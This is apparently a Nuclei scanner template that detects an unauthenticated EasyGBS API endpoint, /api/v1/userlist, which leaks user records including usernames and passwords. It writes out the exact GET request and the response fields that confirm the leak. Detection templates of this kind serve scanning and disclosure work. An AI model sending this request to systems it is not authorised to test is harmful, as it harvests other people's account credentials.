id: easygbs-userlist-info-disclosure

info:
  name: EasyGBS 用户信息泄漏
  author: qwtd
  severity: high
  description: |-
    EasyGBS /api/v1/userlist 存在未授权访问，会导致用户信息泄漏,可泄露账号密码
  tags: EasyGBS

http:
  - raw:
      - |
        GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"UserCount":'
          - '"Nickname":'
          - '"Username":'
          - '"Password":'
          - '"CreateTime":'
        part: body
        condition: and